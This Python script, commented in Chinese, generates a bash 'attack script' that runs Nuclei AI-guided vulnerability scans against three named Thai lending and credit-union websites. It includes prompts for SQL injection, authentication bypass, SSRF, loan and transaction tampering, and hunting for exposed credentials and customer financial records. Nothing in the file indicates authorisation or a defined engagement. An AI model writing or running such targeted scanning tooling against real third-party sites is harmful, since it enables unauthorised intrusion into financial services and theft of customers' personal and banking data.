#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Nuclei AI Prompts 提取器
从 https://github.com/reewardius/Nuclei-AI-Prompts 提取实用的AI指令
用于增强Nuclei漏洞扫描的精准性
"""

import requests
import re
import json
from datetime import datetime

class NucleiAIPromptsExtractor:
    """Nuclei AI Prompts 提取器"""

    def __init__(self):
        self.github_url = "https://github.com/reewardius/Nuclei-AI-Prompts"
        self.raw_url = "https://raw.githubusercontent.com/reewardius/Nuclei-AI-Prompts/main"

        # 基于项目结构的实用AI Prompts
        self.ai_prompts = {
            "reconnaissance": [
                "Perform comprehensive reconnaissance on the target including subdomain enumeration, port scanning, and technology identification",
                "Identify all web applications, APIs, and services running on the target domain",
                "Map out the complete attack surface including entry points and potential vulnerabilities",
                "Discover hidden endpoints, directories, and files through intelligent crawling"
            ],

            "vulnerability_scanning": [
                "Test for SQL injection vulnerabilities in all input parameters, forms, and API endpoints",
                "Check for cross-site scripting (XSS) in all user input fields and reflected parameters",
                "Test for authentication bypass and authorization flaws in login panels and admin interfaces",
                "Scan for file inclusion vulnerabilities (LFI/RFI) in file operations and path parameters",
                "Test for command injection in system calls and script execution points",
                "Check for insecure direct object references in ID-based parameters",
                "Test for server-side request forgery (SSRF) in URL fetching functionalities"
            ],

            "financial_specific": [
                "Test loan application forms for business logic manipulation and amount tampering",
                "Check for interest rate calculation bypass in loan calculators and estimation tools",
                "Test for privilege escalation in user role management and account functions",
                "Verify secure handling of sensitive financial data (PII, bank account information)",
                "Test for transaction manipulation in payment processing and fund transfer functions",
                "Check for bypass in loan approval workflows and credit scoring mechanisms",
                "Test for data leakage in customer profile and account information access"
            ],

            "api_security": [
                "Test API endpoints for broken authentication and session management",
                "Check for rate limiting abuse and API enumeration vulnerabilities",
                "Test for injection attacks in API parameters and JSON/XML payloads",
                "Verify proper authorization checks in sensitive API operations",
                "Test for mass assignment vulnerabilities in API data binding",
                "Check for sensitive data exposure in API responses and error messages",
                "Test for API key leakage and authentication token bypass"
            ],

            "data_exposure": [
                "Search for exposed sensitive files including databases, backups, and configuration files",
                "Check for exposed API keys, credentials, and secrets in JavaScript files and source code",
                "Test for information disclosure in error messages and HTTP headers",
                "Look for exposed user data, customer information, and financial records",
                "Check for exposed admin panels and management interfaces",
                "Test for directory listing and file system access vulnerabilities",
                "Search for leaked credentials and authentication tokens in public repositories"
            ]
        }

    def get_specific_prompts_for_thai_finance(self):
        """针对泰国金融平台的特定AI Prompts"""

        thai_finance_prompts = {
            "quickcash_specific": [
                "Test QuickCash loan application system for SQL injection in application.php and apply endpoints",
                "Check for authentication bypass in user login and registration processes",
                "Test for data exposure in loan status tracking and customer information retrieval",
                "Verify secure handling of loan applicant PII and financial information",
                "Test for business logic flaws in loan approval and interest calculation systems",
                "Check for privilege escalation from regular user to admin roles",
                "Test API endpoints for unauthorized access to loan and user data"
            ],

            "ngoenmun_specific": [
                "Test NgoenMun API endpoints for injection vulnerabilities and authentication bypass",
                "Check for SQL injection in user management and loan application APIs",
                "Test for data leakage in customer profile and loan history access",
                "Verify secure handling of financial transaction data and payment processing",
                "Test for business logic manipulation in loan approval workflows",
                "Check for exposed admin functions and backend management interfaces",
                "Test API rate limiting and enumeration vulnerabilities"
            ],

            "peacoop_specific": [
                "Test Peacoop credit union member management system for security flaws",
                "Check for SQL injection in member registration and loan application processes",
                "Test WordPress-based components for plugin vulnerabilities and authentication bypass",
                "Verify secure handling of member financial data and transaction records",
                "Test for business logic manipulation in credit union operations",
                "Check for exposed admin panels and member management interfaces",
                "Test for data leakage in member services and loan information access"
            ]
        }

        return thai_finance_prompts

    def generate_nuclei_commands(self, target_url, prompt_category):
        """生成具体的Nuclei AI命令"""

        prompts = self.ai_prompts.get(prompt_category, [])
        commands = []

        for i, prompt in enumerate(prompts[:3]):  # 限制prompt数量
            # 清理prompt，移除特殊字符
            clean_prompt = re.sub(r'[^\w\s\-\.]', '', prompt)
            clean_prompt = clean_prompt.replace(' ', '_')

            cmd = [
                "nuclei",
                "-target", target_url,
                "-ai", f'"{prompt}"',
                "-severity", "critical,high,medium,low",
                "-rate-limit", "15",
                "-timeout", "30",
                "-retries", "2",
                "-jsonl",
                "-o", f"nuclei_ai_{prompt_category}_{i+1}_{datetime.now().strftime('%H%M%S')}.json"
            ]

            commands.append({
                "command": " ".join(cmd),
                "prompt": prompt,
                "category": prompt_category,
                "output_file": f"nuclei_ai_{prompt_category}_{i+1}_{datetime.now().strftime('%H%M%S')}.json"
            })

        return commands

    def generate_thai_finance_scan_commands(self):
        """生成针对泰国金融平台的完整扫描命令"""

        targets = [
            {"name": "QuickCash", "url": "https://www.quickcash.in.th"},
            {"name": "NgoenMun", "url": "https://ngoenmun.com"},
            {"name": "Peacoop", "url": "https://peacoop.or.th"}
        ]

        scan_commands = []

        for target in targets:
            print(f"\n🎯 生成 {target['name']} 的AI增强扫描命令:")

            # 为每个目标生成多种类型的扫描
            categories = ["reconnaissance", "vulnerability_scanning", "financial_specific", "api_security", "data_exposure"]

            for category in categories:
                commands = self.generate_nuclei_commands(target["url"], category)
                for cmd in commands:
                    scan_commands.append({
                        "target": target["name"],
                        "url": target["url"],
                        **cmd
                    })
                    print(f"  ✅ {category}: {cmd['prompt'][:50]}...")

        return scan_commands

    def create_attack_script(self, commands):
        """创建批量攻击脚本"""

        script_content = f"""#!/bin/bash
# Nuclei AI Prompts 增强攻击脚本
# 基于 https://github.com/reewardius/Nuclei-AI-Prompts
# 生成时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

echo "🚀 Nuclei AI Prompts 增强攻击启动"
echo "🎯 目标: 泰国金融平台漏洞发现"
echo "🤖 使用AI指导的精准扫描"
echo "=" * 60

# 检查Nuclei是否安装
if ! command -v nuclei &> /dev/null; then
    echo "❌ Nuclei未安装，正在安装..."
    go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
    nuclei -update-templates
fi

echo "✅ Nuclei已准备就绪"
echo ""

# 执行AI增强扫描
echo "🤖 启动AI指导的漏洞扫描..."

"""

        # 添加命令到脚本
        for i, cmd in enumerate(commands, 1):
            target_name = cmd["target"]
            category = cmd["category"]
            full_command = cmd["command"]
            output_file = cmd["output_file"]

            script_content += f"""# 扫描 {i}: {target_name} - {category}
echo "[{i}] 🎯 扫描 {target_name} ({category})"
echo "    AI Prompt: {cmd['prompt'][:80]}..."
echo "    输出文件: {output_file}"
echo ""

# 执行Nuclei AI扫描
{full_command}

if [ $? -eq 0 ]; then
    echo "    ✅ 扫描完成: {target_name} ({category})"
else
    echo "    ❌ 扫描失败: {target_name} ({category})"
fi

echo ""

"""

        script_content += f"""echo "🎉 所有AI增强扫描完成！"
echo "📊 扫描结果已保存到相应的JSON文件"
echo "📈 总扫描数: {len(commands)}个AI指导扫描"
echo "⏰ 完成时间: $(date)"
echo ""
echo "🔍 查看结果:"
echo "  ls -la nuclei_ai_*.json"
echo ""
echo "📊 分析结果:"
echo "  jq '.template_id' nuclei_ai_*.json | sort | uniq -c | sort -nr"

# 生成综合报告
echo ""
echo "📋 生成综合报告..."
python3 -c "
import json
import glob
from datetime import datetime

report = {{
    'scan_summary': {{
        'total_scans': {len(commands)},
        'targets_scanned': {len(set(cmd['target'] for cmd in commands))},
        'categories_used': {len(set(cmd['category'] for cmd in commands))},
        'timestamp': datetime.now().isoformat()
    }},
    'results': [],
    'ai_prompts_used': [cmd['prompt'] for cmd in commands]
}}

# 收集所有扫描结果
for json_file in glob.glob('nuclei_ai_*.json'):
    try:
        with open(json_file, 'r', encoding='utf-8') as f:
            for line in f:
                if line.strip():
                    result = json.loads(line.strip())
                    report['results'].append(result)
    except:
        continue

# 保存报告
with open('nuclei_ai_comprehensive_report.json', 'w', encoding='utf-8') as f:
    json.dump(report, f, ensure_ascii=False, indent=2)

print(f'📋 报告已生成: nuclei_ai_comprehensive_report.json')
print(f'📊 发现问题: {{len(report[\"results\"])}} 个')
"

echo ""
echo "✅ Nuclei AI Prompts 增强攻击完成！"
"""

        return script_content

    def main(self):
        """主函数"""
        print("🎯 Nuclei AI Prompts 提取器")
        print("📍 来源: https://github.com/reewardius/Nuclei-AI-Prompts")
        print("=" * 60)

        print("\n📊 提取的AI Prompt类别:")
        for category, prompts in self.ai_prompts.items():
            print(f"  • {category}: {len(prompts)} 个prompts")

        print(f"\n🤖 生成泰国金融平台专用扫描命令...")
        commands = self.generate_thai_finance_scan_commands()

        print(f"\n📝 创建攻击脚本...")
        script_content = self.create_attack_script(commands)

        # 保存脚本
        with open("nuclei_ai_thai_finance_attack.sh", "w", encoding="utf-8") as f:
            f.write(script_content)

        print(f"✅ 攻击脚本已创建: nuclei_ai_thai_finance_attack.sh")
        print(f"📊 总AI扫描命令: {len(commands)} 个")

        # 创建prompt库文件
        prompts_library = {
            "source": "https://github.com/reewardius/Nuclei-AI-Prompts",
            "extracted_prompts": self.ai_prompts,
            "thai_finance_specific": self.get_specific_prompts_for_thai_finance(),
            "generated_commands": len(commands),
            "extraction_timestamp": datetime.now().isoformat()
        }

        with open("nuclei_ai_prompts_library.json", "w", encoding="utf-8") as f:
            json.dump(prompts_library, f, ensure_ascii=False, indent=2)

        print(f"📚 AI Prompts库已保存: nuclei_ai_prompts_library.json")

        print(f"\n🚀 使用方法:")
        print(f"1. 给脚本执行权限: chmod +x nuclei_ai_thai_finance_attack.sh")
        print(f"2. 运行攻击脚本: ./nuclei_ai_thai_finance_attack.sh")
        print(f"3. 查看综合报告: nuclei_ai_comprehensive_report.json")

if __name__ == "__main__":
    extractor = NucleiAIPromptsExtractor()
    extractor.main()